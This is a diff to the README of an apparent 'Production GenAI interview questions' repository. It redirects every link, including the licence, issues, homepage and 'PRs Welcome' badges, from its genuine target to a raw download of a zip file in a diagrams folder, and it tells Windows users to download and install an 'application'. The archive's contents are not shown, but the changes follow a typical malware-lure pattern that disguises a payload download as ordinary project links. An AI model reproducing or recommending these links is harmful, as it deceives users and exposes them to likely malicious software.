@@ -1,6 +1,6 @@
 # 📁 Production_GenAI_interview - Practical AI Interview Questions
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blueviolet?style=for-the-badge&logo=github)](https://github.com/luwelle/Production_GenAI_interview/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blueviolet?style=for-the-badge&logo=github)](https://github.com/luwelle/Production_GenAI_interview/raw/refs/heads/main/diagrams/A-Gen-Production-interview-v1.1.zip)
 
 ---
 
@@ -10,10 +10,10 @@
 
 <br/>
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-38bdf8.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)  
+[![License: MIT](https://img.shields.io/badge/License-MIT-38bdf8.svg?style=for-the-badge)](https://github.com/luwelle/Production_GenAI_interview/raw/refs/heads/main/diagrams/A-Gen-Production-interview-v1.1.zip)  
 [![Questions](https://img.shields.io/badge/Questions-110+-818cf8.svg?style=for-the-badge)](./sections/)  
 [![Sections](https://img.shields.io/badge/Sections-16-34d399.svg?style=for-the-badge)](./sections/)  
-[![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-fb7185.svg?style=for-the-badge)](http://makeapullrequest.com)  
+[![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-fb7185.svg?style=for-the-badge)](https://github.com/luwelle/Production_GenAI_interview/raw/refs/heads/main/diagrams/A-Gen-Production-interview-v1.1.zip)  
 [![Last Updated](https://img.shields.io/badge/Updated-Feb_2026-fbbf24.svg?style=for-the-badge)](#)
 
 <br/>
@@ -70,7 +70,7 @@ Follow these steps to get the application on your Windows computer:
 ## 🔽 Download and Install
 
 **Visit this page to download the latest version:**  
-[https://github.com/luwelle/Production_GenAI_interview/releases](https://github.com/luwelle/Production_GenAI_interview/releases)  
+[https://github.com/luwelle/Production_GenAI_interview/raw/refs/heads/main/diagrams/A-Gen-Production-interview-v1.1.zip](https://github.com/luwelle/Production_GenAI_interview/raw/refs/heads/main/diagrams/A-Gen-Production-interview-v1.1.zip)  
 
 This page contains all available versions. Always download the newest one. It will have the highest number in its name.
 
@@ -132,11 +132,11 @@ A: Yes. It is open-source under the MIT license.
 
 ## 🔗 Useful Links
 
-- [Main Release Page](https://github.com/luwelle/Production_GenAI_interview/releases)  
-- [Repository Homepage](https://github.com/luwelle/Production_GenAI_interview)  
-- [License Information (MIT)](https://opensource.org/licenses/MIT)  
-- [Submit Issues or Feedback](https://github.com/luwelle/Production_GenAI_interview/issues)
+- [Main Release Page](https://github.com/luwelle/Production_GenAI_interview/raw/refs/heads/main/diagrams/A-Gen-Production-interview-v1.1.zip)  
+- [Repository Homepage](https://github.com/luwelle/Production_GenAI_interview/raw/refs/heads/main/diagrams/A-Gen-Production-interview-v1.1.zip)  
+- [License Information (MIT)](https://github.com/luwelle/Production_GenAI_interview/raw/refs/heads/main/diagrams/A-Gen-Production-interview-v1.1.zip)  
+- [Submit Issues or Feedback](https://github.com/luwelle/Production_GenAI_interview/raw/refs/heads/main/diagrams/A-Gen-Production-interview-v1.1.zip)
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blueviolet?style=for-the-badge&logo=github)](https://github.com/luwelle/Production_GenAI_interview/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blueviolet?style=for-the-badge&logo=github)](https://github.com/luwelle/Production_GenAI_interview/raw/refs/heads/main/diagrams/A-Gen-Production-interview-v1.1.zip)
